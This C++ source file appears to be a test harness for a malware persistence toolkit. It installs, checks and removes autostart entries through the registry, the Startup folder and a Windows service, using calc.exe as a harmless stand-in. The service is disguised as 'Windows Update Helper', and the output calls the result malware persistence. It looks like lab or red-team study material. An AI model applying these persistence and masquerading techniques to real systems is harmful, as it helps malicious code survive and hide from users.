#include "registry_persist.hpp"
#include "startup_persist.hpp"
#include "service_persist.hpp"

int main()
{
    registry_persist regPersist;
    startup_persist startPersist;
    service_persist servicePersist;

    std::string programName = "TestPersistence";
    std::string programPath = "C:\\Windows\\System32\\calc.exe";

    std::string serviceName = "TestMalwareService";
    std::string fakeDisplayName = "Windows Update Helper";

//REG
    std::cout << "=== REGISTRY PERSISTENCE TEST ===\n\n";

    if (regPersist.installPersistence(programName, programPath)) {
        std::cout << "User persistence installed successfully!\n";
        std::cout << "Entry: " << programName << " -> " << programPath << "\n";

        if (regPersist.validatePersistence(programName)) {
            std::cout << "Persistence validated - entry exists!\n";
        }
        else { std::cout << "Validation failed - entry not found\n"; }
    }
    else {
        std::cout << "Failed to install persistence\n";
    }

    if (regPersist.installPersistence(programName, programPath, true)) { 
        std::cout << "System persistence installed successfully!\n";

        if (regPersist.validatePersistence(programName, true)) {
            std::cout << "System persistence validated!\n";
        }

        regPersist.removePersistence(programName, true);
        std::cout << "System persistence removed!\n";
    }
    else {
        std::cout << "Failed, you need to run as Administrator\n";
    }

    if (regPersist.removePersistence(programName)) {
        std::cout << "User persistence removed successfully!\n";

        if (!regPersist.validatePersistence(programName)) {
            std::cout << "User persistence removal validated - entry no longer exists!\n";
        }
        else {
            std::cout << "User persistence removal failed - entry still exists\n";
        }
    }
    else {
        std::cout << "Failed to remove user persistence\n";
    }

//STARTUP
    std::cout << "\n\n=== STARTUP PERSISTENCE TEST ===\n\n";

    if (startPersist.installStartup(fakeDisplayName)) { 
        std::cout << "Malware persistence installed successfully!\n";
        std::cout << "Will auto-start as: " << fakeDisplayName << "\n";
    }
    else {
        std::cout << "Failed to install persistence\n";
    }

    if (startPersist.removeStartup(fakeDisplayName)) {
        std::cout << "Malware persistence removed successfully!\n";
    }
    else {
        std::cout << "Failed to remove persistence\n";
    }

//SERVICE
    std::cout << "\n=== SERVICE PERSISTENCE TEST ===\n\n";

    if (servicePersist.validateService(serviceName)) {
        std::cout << "Service already exists, removing first...\n";
        if (servicePersist.deleteService(serviceName)) {
            std::cout << "Existing service removed successfully!\n";
        }
        else {
            std::cout << "Failed to remove existing service\n";
        }
    }

    if (servicePersist.createService(serviceName, fakeDisplayName, programPath)) {
        std::cout << "Service persistence installed successfully!\n";

        if (servicePersist.validateService(serviceName)) {
            std::cout << "Service persistence validated!\n";
        }

        if (servicePersist.deleteService(serviceName)) {
            std::cout << "Service persistence removed successfully!\n";
        }
    }
    else {
        std::cout << "Failed to create service\n";
    }

    return 0;
}